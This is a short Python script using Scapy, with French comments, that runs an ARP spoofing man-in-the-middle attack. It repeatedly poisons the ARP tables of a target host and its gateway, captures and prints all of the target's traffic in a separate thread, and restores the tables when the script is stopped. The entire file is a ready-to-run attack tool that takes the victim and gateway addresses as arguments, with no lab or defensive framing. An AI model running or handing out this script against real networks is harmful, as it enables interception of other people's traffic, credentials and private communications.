from scapy.all import *
import sys
import time
import threading

# Récupérer l'adresse MAC d'une cible à partir de son adresse IP
def get_mac(ip):
    ans, _ = arping(ip, timeout=2, verbose=False)
    for s, r in ans:
        return r[Ether].src
    return None

# Spoof ARP
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"Could not find MAC address for IP: {target_ip}")
        sys.exit(1)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

# Rétablir les tables ARP
def restore(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

# Attaque ARP Spoofing
def arp_spoof(target_ip, gateway_ip):
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nRestoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("ARP tables restored. Exiting.")

# Capturer les trames réseau
def capture_packets(interface, target_ip):
    print(f"Starting packet capture on {interface} for target IP {target_ip}")
    sniff(filter=f"host {target_ip}", iface=interface, prn=lambda x: x.show())

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target IP> <gateway IP> <interface>")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    interface = sys.argv[3]

    # Lancer le thread de capture de paquets
    capture_thread = threading.Thread(target=capture_packets, args=(interface, target_ip))
    capture_thread.start()

    # Lancer le spoof ARP
    arp_spoof(target_ip, gateway_ip)
